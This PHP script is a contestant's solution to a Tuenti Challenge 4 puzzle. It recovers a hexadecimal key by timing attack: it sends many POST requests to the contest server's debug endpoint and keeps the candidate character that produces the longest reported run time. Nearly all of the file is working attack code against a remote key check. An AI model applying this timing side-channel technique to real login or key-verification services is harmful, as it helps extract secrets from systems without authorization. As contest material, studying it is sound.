<?php

/*
 * Tuenti Challenge 4
 *
 * Submission by Shoghi Cervantes
 * @shoghicp / shoghicp@gmail.com
 *
 * Files and helper classes will be uploaded to
 * https://github.com/shoghicp/Tuenti-Challenge-4
 *
 */

define("FILE_PATH", dirname(__FILE__) . "/");
require(FILE_PATH . "../Submission.php");
$submission = new Submission(13);

$input = $submission->getLine();
define("EXTRA_CHAR", "-");
//$perms = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._ ";
$perms = "abcdef0123456789";

$permlen = strlen($perms);

$reqTime = 0;

$partial = "";
while(true){
	$measures = array();
	for($i = 0; $i < $permlen; ++$i){
		$test = $partial . $perms{$i};
		$measures[$test] = getMeasure($input, $test . EXTRA_CHAR);
	}
	arsort($measures);
	$partial = key($measures);
	if(check($input, $partial)){
		echo $partial.PHP_EOL;
		break;
	}
}

$submission->send();


function check($input, $k, &$reqTime = null){
	$fp = stream_socket_client("tcp://54.83.207.90:4242");
	$post = "input=$input&key=".urlencode($k)."&submit=Submit";
	fwrite($fp, "POST /?debug=1&input=$input HTTP/1.0\r\nHost: 54.83.207.90\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($post)."\r\n\r\n".$post);
	$str = "";
	while(!feof($fp)){
		$str .= fread($fp, 4096);
	}
	fclose($fp);

	$str = explode("\r\n", $str);
	$result = $str[4];
	if(preg_match("/Total run: ([0-9\\.\\-\\+e]{1,})/", $result, $matches) > 0){
		$reqTime = floatval($matches[1]);
	}
	if(strpos($result, "Oh, god, you got it wrong!") === false){
		return true;
	}
	return false;
}


function getMeasure($input, $k){
	/*$total = 0;
	for($i = 0; $i < 5; ++$i){
		$reqTime = null;
		check($input, $k, $reqTime);
		if($reqTime !== null){
			$total += $reqTime;
		}else{
			--$i;
		}
	}*/
	$reqTime = null;
	while($reqTime === null){
		check($input, $k, $reqTime);
	}
	return $reqTime;
}
